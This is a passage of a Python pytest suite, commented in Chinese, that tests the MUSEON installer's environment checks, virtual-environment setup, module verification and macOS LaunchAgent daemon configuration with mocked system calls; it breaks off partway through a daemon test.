"""使用者情境壓力測試 — 200+ Real-World Scenarios

對應 features/user_scenarios.feature
10 個 Section、200+ test methods

模擬各種不同個性、產業、需求的老闆在安裝 & 使用 MUSEON 時
會遇到的真實問題場景。
"""

import asyncio
import hashlib
import hmac as hmac_module
import json
import os
import platform
import re
import subprocess
import time
import urllib.error
import urllib.request
from pathlib import Path
from unittest.mock import MagicMock, patch, PropertyMock

import pytest

from museon.installer.models import (
    InstallConfig,
    StepResult,
    StepStatus,
    SystemInfo,
)
from museon.installer.environment import EnvironmentChecker
from museon.installer.python_env import PythonEnvironmentSetup
from museon.installer.module_verifier import ModuleVerifier
from museon.installer.daemon import DaemonConfigurator
from museon.installer.api_keys import ApiKeyConfigurator
from museon.gateway.setup_handlers import SetupManager
from museon.installer.orchestrator import InstallerOrchestrator
from museon.gateway.security import SecurityGate
from museon.gateway.session import SessionManager


# ═══════════════════════════════════════════════════════════════
# Section 1：安裝環境偵測 — EnvironmentChecker (30 tests)
# 模擬：科技業老闆（新 Mac）、設計師（舊 Intel Mac）、學生（Linux）
# ═══════════════════════════════════════════════════════════════


class TestEnvironmentDetection:
    """ENV-01 ~ ENV-30: 環境偵測邊界情況"""

    # --- OS 檢查 ---

    @patch("museon.installer.environment.platform.system", return_value="Linux")
    def test_env01_linux_system_rejected(self, mock_sys):
        """ENV-01: Linux 系統安裝應回傳 FAILED"""
        checker = EnvironmentChecker()
        result = checker.check_os()
        assert result.status == StepStatus.FAILED
        assert "不支援" in result.message or "macOS" in result.message

    @patch("museon.installer.environment.platform.machine", return_value="arm64")
    def test_env02_arm64_detection(self, mock_machine):
        """ENV-02: M1/M2 Mac 偵測 arm64"""
        checker = EnvironmentChecker()
        assert checker.detect_arch() == "arm64"

    @patch("museon.installer.environment.platform.machine", return_value="x86_64")
    def test_env03_intel_detection(self, mock_machine):
        """ENV-03: Intel Mac 偵測 x86_64"""
        checker = EnvironmentChecker()
        assert checker.detect_arch() == "x86_64"

    # --- Python 搜尋 ---

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env04_find_python313(self, mock_run, mock_which):
        """ENV-04: 找到 Python 3.13"""
        mock_which.side_effect = lambda c: "/usr/bin/python3.13" if c == "python3.13" else None
        mock_run.return_value = MagicMock(returncode=0, stdout="Python 3.13.1")
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path == "/usr/bin/python3.13"
        assert "3.13" in version

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env05_find_python312_second_priority(self, mock_run, mock_which):
        """ENV-05: python3.13 不存在，找到 python3.12"""
        def which_side_effect(c):
            if c == "python3.12":
                return "/usr/bin/python3.12"
            return None
        mock_which.side_effect = which_side_effect
        mock_run.return_value = MagicMock(returncode=0, stdout="Python 3.12.0")
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path == "/usr/bin/python3.12"

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env06_find_python311_minimum(self, mock_run, mock_which):
        """ENV-06: 只有 Python 3.11（最低版本）"""
        def which_side_effect(c):
            if c == "python3.11":
                return "/usr/bin/python3.11"
            return None
        mock_which.side_effect = which_side_effect
        mock_run.return_value = MagicMock(returncode=0, stdout="Python 3.11.0")
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path == "/usr/bin/python3.11"

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env07_python310_too_old(self, mock_run, mock_which):
        """ENV-07: Python 3.10 版本太低"""
        mock_which.side_effect = lambda c: "/usr/bin/python3" if c == "python3" else None
        mock_run.return_value = MagicMock(returncode=0, stdout="Python 3.10.5")
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path is None
        assert version is None

    @patch("museon.installer.environment.shutil.which", return_value=None)
    def test_env08_no_python_at_all(self, mock_which):
        """ENV-08: 系統完全沒有 Python"""
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path is None
        assert version is None

    @patch("museon.installer.environment.shutil.which", return_value="/usr/bin/python3")
    @patch("museon.installer.environment.subprocess.run", side_effect=OSError("exec failed"))
    def test_env09_python_path_exists_but_exec_fails(self, mock_run, mock_which):
        """ENV-09: Python 路徑存在但執行失敗"""
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path is None

    def test_env10_parse_version_unknown(self):
        """ENV-10: 版本字串 "Python unknown" """
        result = EnvironmentChecker._parse_version("Python unknown")
        assert result is None

    def test_env11_parse_version_empty(self):
        """ENV-11: 空版本字串"""
        result = EnvironmentChecker._parse_version("")
        assert result is None

    def test_env12_parse_version_with_plus(self):
        """ENV-12: 版本含 "+" 後綴 "Python 3.13.1+" """
        # "3.13.1+" → split(".") → ["3", "13", "1+"] → int("1+") 會失敗
        result = EnvironmentChecker._parse_version("Python 3.13.1+")
        # 此實作在 int("1+") 時會 ValueError → 回傳 None
        # 這是一個已知的邊界 case
        assert result is None or result == (3, 13, 1)

    # --- Node.js 搜尋 ---

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env13_node_with_npm(self, mock_run, mock_which):
        """ENV-13: Node.js 和 npm 都存在"""
        mock_which.side_effect = lambda c: {
            "node": "/usr/local/bin/node",
            "npm": "/usr/local/bin/npm",
        }.get(c)
        mock_run.return_value = MagicMock(returncode=0, stdout="v20.10.0")
        checker = EnvironmentChecker()
        node_path, has_npm = checker.find_node()
        assert node_path == "/usr/local/bin/node"
        assert has_npm is True

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env14_node_without_npm(self, mock_run, mock_which):
        """ENV-14: 有 Node 但沒 npm"""
        mock_which.side_effect = lambda c: "/usr/local/bin/node" if c == "node" else None
        mock_run.return_value = MagicMock(returncode=0, stdout="v20.10.0")
        checker = EnvironmentChecker()
        node_path, has_npm = checker.find_node()
        assert node_path == "/usr/local/bin/node"
        assert has_npm is False

    @patch("museon.installer.environment.shutil.which", return_value=None)
    def test_env15_no_node(self, mock_which):
        """ENV-15: 完全沒有 Node.js"""
        checker = EnvironmentChecker()
        node_path, has_npm = checker.find_node()
        assert node_path is None
        assert has_npm is False

    @patch("museon.installer.environment.shutil.which", return_value="/usr/local/bin/node")
    @patch("museon.installer.environment.subprocess.run", side_effect=FileNotFoundError())
    def test_env16_node_file_not_found(self, mock_run, mock_which):
        """ENV-16: node 指令拋出 FileNotFoundError"""
        checker = EnvironmentChecker()
        node_path, has_npm = checker.find_node()
        assert node_path is None

    # --- 磁碟空間 ---

    @patch("museon.installer.environment.shutil.disk_usage")
    def test_env17_disk_space_sufficient(self, mock_du):
        """ENV-17: 磁碟空間充足 5000 MB"""
        mock_du.return_value = MagicMock(free=5000 * 1024 * 1024)
        checker = EnvironmentChecker()
        result = checker.check_disk_space(Path("/"), min_mb=500)
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.environment.shutil.disk_usage")
    def test_env18_disk_space_low(self, mock_du):
        """ENV-18: 磁碟空間不足 300 MB"""
        mock_du.return_value = MagicMock(free=300 * 1024 * 1024)
        checker = EnvironmentChecker()
        result = checker.check_disk_space(Path("/"), min_mb=500)
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.environment.shutil.disk_usage", side_effect=OSError("perm denied"))
    def test_env19_disk_space_oserror(self, mock_du):
        """ENV-19: 磁碟存取拋出 OSError"""
        checker = EnvironmentChecker()
        # 目前實作沒有 try-except — 這測試確認行為
        with pytest.raises(OSError):
            checker.check_disk_space(Path("/"), min_mb=500)

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    @patch("museon.installer.environment.shutil.disk_usage")
    @patch("museon.installer.environment.platform.system", return_value="darwin")
    @patch("museon.installer.environment.platform.machine", return_value="arm64")
    def test_env20_collect_system_info(self, mock_machine, mock_sys, mock_du, mock_run, mock_which):
        """ENV-20: collect_system_info 整合所有資訊"""
        mock_which.side_effect = lambda c: {
            "python3.13": "/usr/bin/python3.13",
            "node": None,
            "npm": None,
            "brew": "/opt/homebrew/bin/brew",
        }.get(c)
        mock_run.return_value = MagicMock(returncode=0, stdout="Python 3.13.1")
        mock_du.return_value = MagicMock(free=8000 * 1024 * 1024)
        checker = EnvironmentChecker()
        info = checker.collect_system_info()
        assert info.os_type == "darwin"
        assert info.arch == "arm64"
        assert info.python_path is not None

    def test_env21_version_311_boundary(self):
        """ENV-21: Python 3.11.0 邊界版本"""
        version = EnvironmentChecker._parse_version("Python 3.11.0")
        assert version == (3, 11, 0)
        assert version >= (3, 11)

    def test_env22_version_310_below_threshold(self):
        """ENV-22: Python 3.10.99 低於門檻"""
        version = EnvironmentChecker._parse_version("Python 3.10.99")
        assert version == (3, 10, 99)
        assert version < (3, 11)

    def test_env23_version_partial(self):
        """ENV-23: 只有主版本 "Python 3" """
        version = EnvironmentChecker._parse_version("Python 3")
        assert version == (3,) or version is None

    @patch("museon.installer.environment.shutil.which", return_value="/usr/bin/python3")
    @patch("museon.installer.environment.subprocess.run", side_effect=subprocess.TimeoutExpired("python3", 10))
    def test_env24_subprocess_timeout(self, mock_run, mock_which):
        """ENV-24: python3 --version 超時"""
        checker = EnvironmentChecker()
        path, version = checker.find_python()
        assert path is None

    @patch("museon.installer.environment.shutil.which")
    @patch("museon.installer.environment.subprocess.run")
    def test_env25_multiple_python_prefers_highest(self, mock_run, mock_which):
        """ENV-25: 多個 Python 版本共存，優先 3.13"""
        def which_side_effect(c):
            return {
                "python3.13": "/usr/bin/python3.13",
                "python3.11": "/usr/bin/python3.11",
            }.get(c)
        mock_which.side_effect = which_side_effect
        mock_run.return_value = MagicMock(returncode=0, stdout="Python 3.13.1")
        checker = EnvironmentChecker()
        path, _ = checker.find_python()
        assert path == "/usr/bin/python3.13"

    @patch("museon.installer.environment.platform.system", return_value="Darwin")
    def test_env26_macos_check_success(self, mock_sys):
        """ENV-26: macOS 檢查成功"""
        checker = EnvironmentChecker()
        result = checker.check_os()
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.environment.platform.system", return_value="Windows")
    def test_env27_windows_rejected(self, mock_sys):
        """ENV-27: Windows 系統"""
        checker = EnvironmentChecker()
        result = checker.check_os()
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.environment.shutil.disk_usage")
    def test_env28_disk_space_exact_minimum(self, mock_du):
        """ENV-28: 磁碟空間剛好等於最低需求"""
        mock_du.return_value = MagicMock(free=500 * 1024 * 1024)
        checker = EnvironmentChecker()
        result = checker.check_disk_space(Path("/"), min_mb=500)
        assert result.status == StepStatus.SUCCESS

    def test_env29_python_candidates_list(self):
        """ENV-29: PYTHON_CANDIDATES 清單完整性"""
        checker = EnvironmentChecker()
        assert "python3.13" in checker.PYTHON_CANDIDATES
        assert "python3.12" in checker.PYTHON_CANDIDATES
        assert "python3.11" in checker.PYTHON_CANDIDATES
        assert "python3" in checker.PYTHON_CANDIDATES

    @patch("museon.installer.environment.shutil.which", return_value="/usr/local/bin/node")
    @patch("museon.installer.environment.subprocess.run")
    def test_env30_node_version_nonzero(self, mock_run, mock_which):
        """ENV-30: node --version 回傳非零退出碼"""
        mock_run.return_value = MagicMock(returncode=1, stdout="")
        checker = EnvironmentChecker()
        node_path, has_npm = checker.find_node()
        assert node_path is None


# ═══════════════════════════════════════════════════════════════
# Section 2：Python 環境設定 — PythonEnvironmentSetup (20 tests)
# 模擬：餐飲業老闆（不懂 terminal）、工程師（有自己的 venv）
# ═══════════════════════════════════════════════════════════════


class TestPythonEnvironmentSetup:
    """PYENV-01 ~ PYENV-20: Python venv 邊界情況"""

    def test_pyenv01_venv_not_exists(self, tmp_path):
        """PYENV-01: .venv 不存在"""
        setup = PythonEnvironmentSetup()
        assert setup.venv_exists(tmp_path / ".venv") is False

    def test_pyenv02_venv_exists_with_python(self, tmp_path):
        """PYENV-02: .venv 存在且有 bin/python"""
        venv_dir = tmp_path / ".venv"
        python_bin = venv_dir / "bin" / "python"
        python_bin.parent.mkdir(parents=True)
        python_bin.touch()
        setup = PythonEnvironmentSetup()
        assert setup.venv_exists(venv_dir) is True

    def test_pyenv03_venv_dir_exists_but_no_python(self, tmp_path):
        """PYENV-03: .venv 目錄存在但沒有 bin/python"""
        venv_dir = tmp_path / ".venv"
        venv_dir.mkdir()
        setup = PythonEnvironmentSetup()
        assert setup.venv_exists(venv_dir) is False

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv04_create_venv_success(self, mock_run):
        """PYENV-04: 建立 venv 成功"""
        mock_run.return_value = MagicMock(returncode=0)
        setup = PythonEnvironmentSetup()
        result = setup.create_venv("/usr/bin/python3", Path("/tmp/test/.venv"))
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv05_create_venv_failed(self, mock_run):
        """PYENV-05: 建立 venv 失敗"""
        mock_run.return_value = MagicMock(returncode=1, stderr="error creating venv")
        setup = PythonEnvironmentSetup()
        result = setup.create_venv("/usr/bin/python3", Path("/tmp/test/.venv"))
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.python_env.subprocess.run",
           side_effect=subprocess.TimeoutExpired("python3", 120))
    def test_pyenv06_create_venv_timeout(self, mock_run):
        """PYENV-06: 建立 venv 超時"""
        setup = PythonEnvironmentSetup()
        result = setup.create_venv("/usr/bin/python3", Path("/tmp/test/.venv"))
        assert result.status == StepStatus.FAILED
        assert "超時" in result.message

    @patch("museon.installer.python_env.subprocess.run",
           side_effect=OSError("No such file"))
    def test_pyenv07_create_venv_oserror(self, mock_run):
        """PYENV-07: 建立 venv 拋出 OSError"""
        setup = PythonEnvironmentSetup()
        result = setup.create_venv("/nonexistent/python3", Path("/tmp/test/.venv"))
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv08_install_deps_success(self, mock_run):
        """PYENV-08: 安裝依賴成功"""
        mock_run.return_value = MagicMock(returncode=0, stdout="Successfully installed")
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv09_install_deps_failed(self, mock_run):
        """PYENV-09: 安裝依賴失敗"""
        mock_run.return_value = MagicMock(returncode=1, stderr="pip install failed")
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.python_env.subprocess.run",
           side_effect=subprocess.TimeoutExpired("pip", 600))
    def test_pyenv10_install_deps_timeout(self, mock_run):
        """PYENV-10: 安裝依賴超時"""
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert result.status == StepStatus.FAILED
        assert "超時" in result.message

    @patch("museon.installer.python_env.subprocess.run",
           side_effect=OSError("exec failed"))
    def test_pyenv11_install_deps_oserror(self, mock_run):
        """PYENV-11: pip 路徑無效"""
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/bad/python"), Path("/tmp/project"))
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv12_stderr_truncation(self, mock_run):
        """PYENV-12: stderr 截斷至 200 字"""
        long_stderr = "x" * 500
        mock_run.return_value = MagicMock(returncode=1, stderr=long_stderr)
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert result.status == StepStatus.FAILED
        # message 應包含截斷的 stderr
        assert len(result.message) <= 500  # 不會無限長

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv13_stdout_truncation_on_success(self, mock_run):
        """PYENV-13: 成功時 stdout 截斷至 500 字"""
        long_stdout = "y" * 2000
        mock_run.return_value = MagicMock(returncode=0, stdout=long_stdout)
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert result.status == StepStatus.SUCCESS
        assert len(result.details["stdout"]) <= 500

    def test_pyenv14_venv_python_path(self, tmp_path):
        """PYENV-14: venv_python 路徑正確"""
        config = InstallConfig(install_dir=tmp_path)
        assert config.venv_python == tmp_path / ".runtime" / ".venv" / "bin" / "python"

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv15_create_venv_calls_correct_cmd(self, mock_run):
        """PYENV-15: create_venv 使用 -m venv"""
        mock_run.return_value = MagicMock(returncode=0)
        setup = PythonEnvironmentSetup()
        setup.create_venv("/usr/bin/python3", Path("/tmp/.venv"))
        args = mock_run.call_args[0][0]
        assert "-m" in args
        assert "venv" in args

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv16_install_deps_calls_correct_cmd(self, mock_run):
        """PYENV-16: install_dependencies 使用 pip install -e"""
        mock_run.return_value = MagicMock(returncode=0, stdout="ok")
        setup = PythonEnvironmentSetup()
        setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        args = mock_run.call_args[0][0]
        assert "pip" in args
        assert "install" in args
        assert "-e" in args

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv17_create_venv_timeout_value(self, mock_run):
        """PYENV-17: create_venv 超時設為 120 秒"""
        mock_run.return_value = MagicMock(returncode=0)
        setup = PythonEnvironmentSetup()
        setup.create_venv("/usr/bin/python3", Path("/tmp/.venv"))
        assert mock_run.call_args[1]["timeout"] == 120

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv18_install_deps_timeout_value(self, mock_run):
        """PYENV-18: install_dependencies 超時設為 600 秒"""
        mock_run.return_value = MagicMock(returncode=0, stdout="ok")
        setup = PythonEnvironmentSetup()
        setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert mock_run.call_args[1]["timeout"] == 600

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv19_create_venv_stderr_with_success(self, mock_run):
        """PYENV-19: venv 建立 returncode=0 但 stderr 有警告"""
        mock_run.return_value = MagicMock(returncode=0, stderr="Warning: something")
        setup = PythonEnvironmentSetup()
        result = setup.create_venv("/usr/bin/python3", Path("/tmp/.venv"))
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.python_env.subprocess.run")
    def test_pyenv20_install_deps_empty_stdout(self, mock_run):
        """PYENV-20: 安裝成功但 stdout 為空"""
        mock_run.return_value = MagicMock(returncode=0, stdout="")
        setup = PythonEnvironmentSetup()
        result = setup.install_dependencies(Path("/tmp/.venv/bin/python"), Path("/tmp/project"))
        assert result.status == StepStatus.SUCCESS
        assert result.details["stdout"] == ""


# ═══════════════════════════════════════════════════════════════
# Section 3：模組驗證 — ModuleVerifier (15 tests)
# 模擬：安裝到一半中斷、套件損壞、版本衝突
# ═══════════════════════════════════════════════════════════════


class TestModuleVerification:
    """MOD-01 ~ MOD-15: 模組驗證邊界情況"""

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod01_gateway_module_success(self, mock_import):
        """MOD-01: Gateway 模組載入成功"""
        mock_mod = MagicMock()
        mock_mod.create_app = MagicMock()
        mock_import.return_value = mock_mod
        verifier = ModuleVerifier()
        result = verifier.verify_module("museon.gateway.server", "create_app")
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.module_verifier.importlib.import_module",
           side_effect=ImportError("No module"))
    def test_mod02_module_not_found(self, mock_import):
        """MOD-02: 模組不存在"""
        verifier = ModuleVerifier()
        result = verifier.verify_module("nonexistent.module", "some_attr")
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod03_module_exists_attr_missing(self, mock_import):
        """MOD-03: 模組存在但屬性缺失"""
        mock_mod = MagicMock(spec=[])  # no attributes
        mock_import.return_value = mock_mod
        verifier = ModuleVerifier()
        result = verifier.verify_module("some.module", "missing_attr")
        assert result.status == StepStatus.WARNING
        assert "找不到" in result.message

    @patch("museon.installer.module_verifier.importlib.import_module",
           side_effect=RuntimeError("init error"))
    def test_mod04_module_runtime_error(self, mock_import):
        """MOD-04: 模組載入時拋出 RuntimeError"""
        verifier = ModuleVerifier()
        result = verifier.verify_module("broken.module", "attr")
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod05_verify_all_success(self, mock_import):
        """MOD-05: 所有 4 個核心模組都成功"""
        mock_mod = MagicMock()
        mock_import.return_value = mock_mod
        verifier = ModuleVerifier()
        results = verifier.verify_all()
        assert len(results) == 4
        assert all(r.status == StepStatus.SUCCESS for r in results)

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod06_verify_all_mixed(self, mock_import):
        """MOD-06: 部分成功部分失敗"""
        call_count = 0
        def side_effect(module_path):
            nonlocal call_count
            call_count += 1
            if call_count == 2:
                raise ImportError("missing")
            return MagicMock()
        mock_import.side_effect = side_effect
        verifier = ModuleVerifier()
        results = verifier.verify_all()
        statuses = {r.status for r in results}
        assert StepStatus.SUCCESS in statuses
        assert StepStatus.WARNING in statuses

    def test_mod07_verify_all_count(self):
        """MOD-07: verify_all 回傳 4 個結果"""
        verifier = ModuleVerifier()
        assert len(ModuleVerifier.CORE_MODULES) == 4

    def test_mod08_core_modules_complete(self):
        """MOD-08: CORE_MODULES 包含 4 大模組"""
        names = [name for name, _, _ in ModuleVerifier.CORE_MODULES]
        assert "Gateway" in names
        assert "LLM Router" in names
        assert "Memory Engine" in names
        assert "Security" in names

    def test_mod09_module_paths_dotted(self):
        """MOD-09: 所有模組路徑為點分格式"""
        for _, path, _ in ModuleVerifier.CORE_MODULES:
            assert "." in path

    @patch("museon.installer.module_verifier.importlib.import_module",
           side_effect=ImportError(""))
    def test_mod10_empty_module_path(self, mock_import):
        """MOD-10: 空字串模組路徑"""
        verifier = ModuleVerifier()
        result = verifier.verify_module("", "attr")
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod11_empty_attr_name(self, mock_import):
        """MOD-11: 空字串屬性名"""
        mock_mod = MagicMock(spec=[])
        mock_import.return_value = mock_mod
        verifier = ModuleVerifier()
        result = verifier.verify_module("some.module", "")
        # hasattr(mod, "") may return True/False depending on implementation
        assert result.status in (StepStatus.SUCCESS, StepStatus.WARNING)

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod12_module_side_effects_handled(self, mock_import):
        """MOD-12: 模組載入有副作用但不 crash"""
        mock_import.side_effect = Exception("unexpected side effect")
        verifier = ModuleVerifier()
        result = verifier.verify_module("bad.module", "attr")
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod13_verify_all_step_names(self, mock_import):
        """MOD-13: 結果包含模組路徑"""
        mock_import.return_value = MagicMock()
        verifier = ModuleVerifier()
        results = verifier.verify_all()
        for r in results:
            assert "模組驗證:" in r.step_name

    @patch("museon.installer.module_verifier.importlib.import_module")
    def test_mod14_verify_module_success_message(self, mock_import):
        """MOD-14: 成功訊息包含模組和屬性名"""
        mock_import.return_value = MagicMock()
        verifier = ModuleVerifier()
        result = verifier.verify_module("test.module", "my_func")
        assert "test.module" in result.message
        assert "my_func" in result.message

    def test_mod15_warning_is_ok(self):
        """MOD-15: WARNING 的 is_ok 為 True"""
        result = StepResult(
            step_name="test",
            status=StepStatus.WARNING,
            message="warning",
        )
        assert result.is_ok is True


# ═══════════════════════════════════════════════════════════════
# Section 4：背景服務 — DaemonConfigurator (25 tests)
# 模擬：伺服器管理員、首次用 Mac 的人、有舊版 MUSEON 的人
# ═══════════════════════════════════════════════════════════════


class TestDaemonConfigurator:
    """DMN-01 ~ DMN-25: 背景服務邊界情況"""

    def _make_config(self, tmp_path):
        config = InstallConfig(install_dir=tmp_path)
        config.plist_dir = tmp_path / "LaunchAgents"
        config.log_dir = tmp_path / "logs"
        return config

    def test_dmn01_plist_contains_label(self, tmp_path):
        """DMN-01: plist 包含正確 Label"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert config.plist_name in plist_xml

    def test_dmn02_plist_contains_program_args(self, tmp_path):
        """DMN-02: plist 包含 ProgramArguments"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "ProgramArguments" in plist_xml
        assert "museon.gateway.server" in plist_xml

    def test_dmn03_plist_env_variables(self, tmp_path):
        """DMN-03: plist 包含環境變數"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "PYTHONPATH" in plist_xml
        assert "MUSEON_HOME" in plist_xml

    def test_dmn04_plist_run_at_load(self, tmp_path):
        """DMN-04: RunAtLoad 為 true"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "RunAtLoad" in plist_xml

    def test_dmn05_plist_log_paths(self, tmp_path):
        """DMN-05: plist 包含 log 路徑"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
        assert "StandardOutPath" in plist_xml
        assert "StandardErrorPath" in plist_xml

    def test_dmn06_write_plist_success(self, tmp_path):
        """DMN-06: 寫入 plist 成功"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        result = daemon.write_plist(config)
        assert result.status == StepStatus.SUCCESS
        assert config.plist_path.exists()

    def test_dmn07_write_plist_creates_directories(self, tmp_path):
        """DMN-07: 自動建立目錄"""
        config = self._make_config(tmp_path)
        # plist_dir 和 log_dir 都不存在
        assert not config.plist_dir.exists()
        daemon = DaemonConfigurator()
        daemon.write_plist(config)
        assert config.plist_dir.exists()
        assert config.log_dir.exists()

    def test_dmn08_write_plist_readonly_dir(self, tmp_path):
        """DMN-08: 目錄權限不足（模擬 OSError）"""
        config = self._make_config(tmp_path)
        config.plist_dir = Path("/root/forbidden/LaunchAgents")
        daemon = DaemonConfigurator()
        result = daemon.write_plist(config)
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn09_unload_bootout_success(self, mock_run):
        """DMN-09: bootout 成功卸載"""
        mock_run.return_value = MagicMock(returncode=0)
        daemon = DaemonConfigurator()
        result = daemon.unload_existing("com.museon.gateway")
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn10_unload_bootout_fail_fallback_unload(self, mock_run):
        """DMN-10: bootout 失敗改用 unload"""
        # 第一次 bootout 失敗，第二次 unload 成功
        mock_run.side_effect = [
            MagicMock(returncode=1),  # bootout fails
            MagicMock(returncode=0),  # unload succeeds
        ]
        daemon = DaemonConfigurator()
        result = daemon.unload_existing("com.museon.gateway")
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn11_unload_no_existing_daemon(self, mock_run):
        """DMN-11: 沒有現有 daemon"""
        mock_run.side_effect = [
            MagicMock(returncode=3),  # bootout fails
            MagicMock(returncode=3),  # unload also fails (no daemon)
        ]
        daemon = DaemonConfigurator()
        result = daemon.unload_existing("com.museon.gateway")
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn12_load_daemon_success(self, mock_run):
        """DMN-12: 載入 daemon 成功"""
        mock_run.return_value = MagicMock(returncode=0)
        daemon = DaemonConfigurator()
        result = daemon.load_daemon(Path("/tmp/test.plist"))
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn13_load_daemon_failed(self, mock_run):
        """DMN-13: 載入 daemon 失敗"""
        mock_run.return_value = MagicMock(returncode=1, stderr="load failed")
        daemon = DaemonConfigurator()
        result = daemon.load_daemon(Path("/tmp/test.plist"))
        assert result.status == StepStatus.FAILED

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn14_health_check_success(self, mock_run):
        """DMN-14: 健康檢查 HTTP 200"""
        mock_run.return_value = MagicMock(returncode=0, stdout="200")
        daemon = DaemonConfigurator()
        result = daemon.check_health_endpoint(port=8765)
        assert result.status == StepStatus.SUCCESS

    @patch("museon.installer.daemon.subprocess.run")
    def test_dmn15_health_check_non200(self, mock_run):
        """DMN-15: 健康檢查非 200"""
        mock_run.return_value = MagicMock(returncode=0, stdout="500")
        daemon = DaemonConfigurator()
        result = daemon.check_health_endpoint()
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.daemon.subprocess.run",
           side_effect=subprocess.TimeoutExpired("curl", 5))
    def test_dmn16_health_check_timeout(self, mock_run):
        """DMN-16: 健康檢查超時"""
        daemon = DaemonConfigurator()
        result = daemon.check_health_endpoint(timeout=3)
        assert result.status == StepStatus.WARNING

    @patch("museon.installer.daemon.subprocess.run",
           side_effect=OSError("curl not found"))
    def test_dmn17_health_check_no_curl(self, mock_run):
        """DMN-17: curl 不存在"""
        daemon = DaemonConfigurator()
        result = daemon.check_health_endpoint()
        assert result.status == StepStatus.WARNING

    def test_dmn18_plist_path_correct(self, tmp_path):
        """DMN-18: plist_path 正確"""
        config = InstallConfig(install_dir=tmp_path)
        assert "LaunchAgents" in str(config.plist_path)
        assert "com.museon.gateway.plist" in str(config.plist_path)

    @patch("museon.installer.daemon.subprocess.run",
           side_effect=subprocess.TimeoutExpired("launchctl", 30))
    def test_dmn19_unload_timeout(self, mock_run):
        """DMN-19: 卸載 daemon 超時"""
        daemon = DaemonConfigurator()
        result = daemon.unload_existing("com.museon.gateway")
        assert result.status == StepStatus.SUCCESS  # timeout still returns success

    def test_dmn20_plist_throttle_interval(self, tmp_path):
        """DMN-20: ThrottleInterval 為 5"""
        config = self._make_config(tmp_path)
        daemon = DaemonConfigurator()
        plist_xml = daemon.generate_plist(config)
